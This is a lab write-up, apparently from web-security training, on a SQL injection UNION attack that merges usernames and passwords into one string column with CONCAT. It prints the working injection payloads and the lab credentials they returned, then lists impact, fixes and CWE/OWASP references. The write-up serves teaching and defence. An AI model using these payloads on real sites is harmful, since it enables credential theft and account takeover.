# Lab: SQL injection UNION attack, retrieving multiple values in a single column

**Category:** SQL Injection
**Difficulty:** Practitioner
**Objective:** Retrieve all usernames and passwords from the `users` table and log in as the administrator

## 0. Attacker mindset

The original query return only one column that accepts string. I need to combine both `username` and `password` into that single column using string concatenation, with a separator to distinguish them.

## 1. What is the vulnerability?

The product category filter passes user input directly into a SQL query. An attacker can inject a `UNION SELECT` that extracts data from other tables.
When only one column is string-compatible, concatenation functions expose multiple values in a single result cell.

## 2. How did I exploit it?

1. Confirmed the query return 2 columns and the second one accepts strings: `' UNION SELECT NULL,'test'--` -> `test` appeared in the page.
2. Injected a `UNION SELECT` using `CONCAT` to merge `username` and `password` into the second column: `Lifestyle'+UNION+SELECT+NULL,CONCAT(username,'~',password)+FROM+users--`  
3. The response displayed the concatenated credentials in the product table:
- `administrator~i1d1vlep16nwrx7gd4n5`
- `wiener~0t4aa392d80f5xk8lg6m`
- `carlos~iz71rtbv4g4e2jpjc65w`
4. Extracted the administrator password after the `~` separator and logged in. Lab solved.

## 3. Impact

- Direct credential theft via single-column extraction
- Full account takeover, including administrative access
- Demonstrates that even limited string output enables full data exfiltration through concatenation

## 4. How can it be fixed?

- Use parameterized queries (prepared statements) for all database access
- Apply allowlist validation on user-supplied input
- Hash and salt stored passwords
- Enforce least privilege on the database account used by the application

---

**MITRE ATT&CK:** [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)

**CWE:** [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

**CAPEC:** [CAPEC-66: SQL Injection](https://capec.mitre.org/data/definitions/66.html)

**OWASP:** [A05:2025 Injection](https://owasp.org/Top10/2025/A05_2025-Injection/)

**EMB3D:** [TID-320: SQL Injection](https://emb3d.mitre.org/threats/TID-320.html)